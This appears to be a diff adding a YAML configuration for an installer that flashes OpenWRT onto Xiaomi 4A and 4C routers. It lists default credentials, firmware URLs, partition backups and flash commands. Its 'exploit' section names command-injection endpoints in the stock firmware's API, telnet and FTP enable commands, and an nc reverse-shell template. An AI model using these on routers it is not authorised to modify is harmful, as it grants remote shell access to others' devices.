@@ -1,0 +1,166 @@
+# OpenWRT Xiaomi Router Installer - Configuration
+# ================================================
+
+router_defaults:
+  ip: "192.168.31.1"
+  username: "root"
+  password: "root"
+  telnet_port: 23
+  ftp_port: 21
+  ssh_port: 22
+  web_port: 80
+  openwrt_ip: "192.168.1.1"
+
+# Timeout settings (seconds)
+timeouts:
+  connection: 10
+  telnet: 30
+  ftp: 60
+  flash: 300
+  reboot_wait: 120
+  ping_retry_interval: 5
+  ping_max_attempts: 30
+
+# OpenWRT base download URL
+openwrt_base_url: "https://downloads.openwrt.org/releases/24.10.0/targets"
+
+models:
+  # ─────────────────────────────────────────────
+  # Xiaomi Mi Router 4A Gigabit Edition (V1)
+  # ─────────────────────────────────────────────
+  4a_gigabit_v1:
+    display_name: "Xiaomi Mi Router 4A Gigabit Edition (V1)"
+    short_name: "R4A_V1"
+    chipset: "MT7621"
+    flash_mb: 16
+    ram_mb: 128
+    firmware_version_max: "2.30.19"   # V1 is below 2.30.20
+    openwrt_target: "ramips/mt7621"
+    firmware_filename: "openwrt-24.10.0-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin"
+    firmware_url: "https://downloads.openwrt.org/releases/24.10.0/targets/ramips/mt7621/openwrt-24.10.0-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin"
+    sha256: ""   # populated at runtime from sums file
+    sha256_url: "https://downloads.openwrt.org/releases/24.10.0/targets/ramips/mt7621/sha256sums"
+    mtd_flash_partition: "OS1"
+    flash_command: "mtd -e OS1 -r write /tmp/firmware.bin OS1"
+    ftp_upload_path: "/tmp/firmware.bin"
+    supports_telnet_exploit: true
+    backup_mtd:
+      - name: "all"
+        source: "/dev/mtd0"
+        dest: "all.bin"
+      - name: "Bootloader"
+        source: "/dev/mtd1"
+        dest: "Bootloader.bin"
+      - name: "Config"
+        source: "/dev/mtd2"
+        dest: "Config.bin"
+      - name: "OS1"
+        source: "/dev/mtd3"
+        dest: "OS1.bin"
+      - name: "OS2"
+        source: "/dev/mtd4"
+        dest: "OS2.bin"
+      - name: "rootfs_data"
+        source: "/dev/mtd5"
+        dest: "rootfs_data.bin"
+    openwrt_credentials:
+      username: "root"
+      password: ""   # no password on first boot
+
+  # ─────────────────────────────────────────────
+  # Xiaomi Mi Router 4A Gigabit Edition (V2)
+  # ─────────────────────────────────────────────
+  4a_gigabit_v2:
+    display_name: "Xiaomi Mi Router 4A Gigabit Edition (V2)"
+    short_name: "R4A_V2"
+    chipset: "MT7621"
+    flash_mb: 16
+    ram_mb: 128
+    firmware_version_min: "2.30.20"   # V2 starts at 2.30.20
+    openwrt_target: "ramips/mt7621"
+    firmware_filename: "openwrt-24.10.0-ramips-mt7621-xiaomi_mi-router-4a-gigabit-v2-squashfs-sysupgrade.bin"
+    firmware_url: "https://downloads.openwrt.org/releases/24.10.0/targets/ramips/mt7621/openwrt-24.10.0-ramips-mt7621-xiaomi_mi-router-4a-gigabit-v2-squashfs-sysupgrade.bin"
+    sha256: ""
+    sha256_url: "https://downloads.openwrt.org/releases/24.10.0/targets/ramips/mt7621/sha256sums"
+    mtd_flash_partition: "OS1"
+    flash_command: "mtd -e OS1 -r write /tmp/firmware.bin OS1"
+    ftp_upload_path: "/tmp/firmware.bin"
+    supports_telnet_exploit: true
+    special_handling: "v2_firmware"   # requires special handling for >=2.30.20
+    backup_mtd:
+      - name: "all"
+        source: "/dev/mtd0"
+        dest: "all.bin"
+      - name: "Bootloader"
+        source: "/dev/mtd1"
+        dest: "Bootloader.bin"
+      - name: "Config"
+        source: "/dev/mtd2"
+        dest: "Config.bin"
+      - name: "OS1"
+        source: "/dev/mtd3"
+        dest: "OS1.bin"
+      - name: "OS2"
+        source: "/dev/mtd4"
+        dest: "OS2.bin"
+      - name: "rootfs_data"
+        source: "/dev/mtd5"
+        dest: "rootfs_data.bin"
+    openwrt_credentials:
+      username: "root"
+      password: ""
+
+  # ─────────────────────────────────────────────
+  # Xiaomi Mi Router 4C
+  # ─────────────────────────────────────────────
+  4c:
+    display_name: "Xiaomi Mi Router 4C"
+    short_name: "R4C"
+    chipset: "MT7628AN"
+    flash_mb: 16
+    ram_mb: 64
+    openwrt_target: "ramips/mt76x8"
+    firmware_filename: "openwrt-24.10.0-ramips-mt76x8-xiaomi_mi-router-4c-squashfs-sysupgrade.bin"
+    firmware_url: "https://downloads.openwrt.org/releases/24.10.0/targets/ramips/mt76x8/openwrt-24.10.0-ramips-mt76x8-xiaomi_mi-router-4c-squashfs-sysupgrade.bin"
+    sha256: ""
+    sha256_url: "https://downloads.openwrt.org/releases/24.10.0/targets/ramips/mt76x8/sha256sums"
+    mtd_flash_partition: "OS1"
+    flash_command: "mtd -r write /tmp/firmware.bin OS1"
+    ftp_upload_path: "/tmp/firmware.bin"
+    supports_telnet_exploit: true
+    backup_mtd:
+      - name: "all"
+        source: "/dev/mtd0"
+        dest: "all.bin"
+      - name: "Bootloader"
+        source: "/dev/mtd1"
+        dest: "Bootloader.bin"
+      - name: "Config"
+        source: "/dev/mtd2"
+        dest: "Config.bin"
+      - name: "OS1"
+        source: "/dev/mtd3"
+        dest: "OS1.bin"
+    openwrt_credentials:
+      username: "root"
+      password: ""
+    recovery_method: "reset_button"   # hold reset for 10s while powering on
+
+# Exploit endpoints (OpenWRTInvasion-compatible)
+exploit:
+  stok_url: "http://{ip}/cgi-bin/luci/;stok={stok}/api/misystem/set_config_iotdev"
+  login_url: "http://{ip}/cgi-bin/luci/api/xqsystem/login"
+  config_url: "http://{ip}/cgi-bin/luci/;stok=/api/misystem/set_config_iotdev"
+  status_url: "http://{ip}/cgi-bin/luci/api/xqsystem/router_info"
+  command_url: "http://{ip}/cgi-bin/luci/;stok={stok}/api/misystem/set_config_iotdev"
+  telnet_enable_cmd: "nvram set telnet_en=1; nvram commit; /etc/init.d/telnetd start"
+  ftp_enable_cmd: "nvram set ftp_en=1; nvram commit; /usr/sbin/tcpsvd 0 21 ftpd -w / &"
+  shell_cmd_template: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 4455 >/tmp/f"
+
+# Logging configuration
+logging:
+  file_prefix: "openwrt_installer"
+  max_size_mb: 10
+  backup_count: 5
+  format: "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
+  date_format: "%Y-%m-%d %H:%M:%S"
